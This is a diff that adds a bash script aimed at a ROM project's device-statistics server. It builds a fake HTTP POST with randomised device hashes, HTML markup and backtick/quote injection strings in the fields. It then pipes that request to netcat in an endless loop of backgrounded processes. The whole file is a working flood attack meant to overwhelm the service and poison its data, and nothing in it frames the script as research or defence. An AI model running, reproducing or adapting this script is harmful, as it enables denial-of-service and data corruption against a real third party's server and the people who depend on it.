@@ -1,0 +1,15 @@
+output(){
+echo "POST /submit HTTP/1.1"
+echo "Content-Length: 334"
+echo "Content-Type: application/x-www-form-urlencoded"
+echo "Host: stats.aicp-rom.com"
+echo "Connection: Keep-Alive"
+echo "User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)"
+echo ""
+echo "device_hash=$((1 + RANDOM % 10))A$((1 + RANDOM % 10))CB$((1 + RANDOM % 10))$((1 + RANDOM % 10))B$((1 + RANDOM % 10))$((1 + RANDOM % 10))D20D9342F31B7AA6E27772&device_name=<b>Ali-Pinara-Asik-Olmus</b>_sprout&device_version=aicp_j\`\'asmine_sprout-userdebug+$((1 + RANDOM % 10))+PQ2A.190305.002+0c087dafd0+release-keys&device_buildtype=WEEKLY&device_country=Turkey&device_carrier=Turk+Telekom&device_carrier_id=28603&rom_name=$((1 + RANDOM % 10))$((1 + RANDOM % 10)).$((1 + RANDOM % 10))&rom_version=$((1 + RANDOM % 10))$((1 + RANDOM % 10)).$((1 + RANDOM % 10))&sign_cert=F$((1 + RANDOM % 10))2DEF\`\'BDA11D182E492287F750F4D2D"
+}
+
+while [ 1 -eq 1 ]
+do
+output | netcat stats.aicp-rom.com 80 &
+done
